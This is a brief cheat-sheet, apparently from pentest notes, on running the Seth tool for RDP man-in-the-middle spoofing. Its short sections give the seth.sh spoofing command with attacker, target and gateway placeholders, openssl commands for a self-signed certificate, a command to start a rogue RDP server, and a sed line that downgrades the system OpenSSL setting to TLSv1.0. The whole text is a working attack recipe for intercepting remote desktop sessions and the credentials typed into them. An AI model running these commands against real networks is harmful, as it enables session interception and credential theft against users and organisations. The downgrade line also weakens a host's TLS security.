### source
https://github.com/SySS-Research/Seth  

### RDP spoofing
```
./seth.sh eth0 <attackerIp> <targetIp> <gatewayIp>
```

### create local RDP server with self generated certificates
```
openssl genrsa -des3 -out certificate.key 4096
openssl req -new -key certificate.key -out certificate.csr
openssl x509 -req -days 365 -in certificate.csr -signkey certificate.key -out certificate.crt
```

### start RDP server
```
python3 seth.py -c certificate.crt -k certificate.key <targetIp>
```

### if SSL error occurs - you might need to downgrade the protocol version
```
sed -i 's/TLSv1.2/TLSv1.0/' -i /etc/ssl/openssl.cnf
```

